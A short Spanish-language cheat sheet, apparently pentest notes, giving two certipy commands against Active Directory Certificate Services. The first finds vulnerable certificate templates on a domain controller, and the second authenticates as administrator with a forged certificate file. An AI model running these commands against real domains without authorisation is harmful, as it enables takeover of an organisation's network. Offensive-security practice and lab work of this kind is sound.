### Conocer el nivel y saber que template es vulnerable:
$ certipy find -u {USER}@{DOMAIN} -p '{PASSWORD}' -dc-ip {IP} -vulnerable -stdout
### Autenticarse usando el TGT creado (administrator.pfx):
$ certipy auth -pfx 'administrator.pfx' -username 'USERNAME' -domain 'DOMAIN' -dc-ip {IP}